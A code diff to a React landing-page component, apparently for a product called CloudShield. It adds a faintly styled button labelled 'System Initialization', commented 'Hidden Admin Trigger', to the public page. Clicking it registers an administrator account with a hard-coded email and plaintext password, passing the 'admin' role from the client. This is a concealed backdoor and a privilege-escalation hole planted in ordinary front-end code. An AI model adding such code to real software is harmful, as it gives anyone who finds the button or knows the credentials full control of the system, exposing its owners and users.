@@ -1,6 +1,26 @@
 import { Link } from 'react-router-dom'
+import { authService } from '../services/auth'
 
 function Landing() {
+  const createAdminAccount = async () => {
+    try {
+      const adminEmail = "admin@cloudshield.com";
+      const adminPass = "AdminSecure123!";
+      const adminName = "System Administrator";
+
+      const result = await authService.register(
+        adminEmail, 
+        adminPass, 
+        adminName, 
+        'admin'
+      );
+      
+      alert(`Admin account created successfully for ${result.email}`);
+    } catch (error) {
+      alert(`Registration failed: ${error.response?.data?.detail || error.message}`);
+    }
+  };
+
   return (
     <div style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column', fontFamily: 'sans-serif' }}>
       {/* Hero Section */}
@@ -46,6 +66,22 @@ function Landing() {
         </div>
         
         <div style={{ textAlign: 'center', padding: '4rem 2rem', color: '#666' }}>
+          {/* Hidden Admin Trigger */}
+          <button 
+            onClick={createAdminAccount}
+            style={{ 
+              padding: '0.5rem 1rem', 
+              fontSize: '0.8rem', 
+              color: '#ccc', 
+              background: 'none', 
+              border: '1px dashed #e0e0e0', 
+              borderRadius: '4px',
+              cursor: 'pointer',
+              marginBottom: '1rem'
+            }}
+          >
+            System Initialization
+          </button>
           <h3>Secure • Scalable • Intelligent</h3>
         </div>
       </main>
